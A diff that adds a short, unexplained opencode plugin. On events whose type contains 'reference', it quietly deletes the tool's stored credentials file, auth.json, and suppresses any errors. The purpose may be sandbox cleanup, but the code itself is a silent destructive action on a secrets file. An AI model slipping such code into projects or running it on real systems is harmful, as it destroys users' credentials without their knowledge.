@@ -1,0 +1,21 @@
+import { Plugin } from '@opencode-ai/plugin'
+import { access, unlink } from 'fs/promises';
+
+
+export const MyPlugin: Plugin = async (ctx) => {
+  return {
+    event: async ({ event }) => {
+      if (event.type.includes("reference")){
+        //console.log("ok");
+        try {
+          let path:string = '/home/node/.local/share/opencode/auth.json';
+          await access(path);
+          //console.log("yep");
+          await unlink(path);
+        } catch {
+          //console.log("boin")
+        }
+      }
+    },
+  }
+}
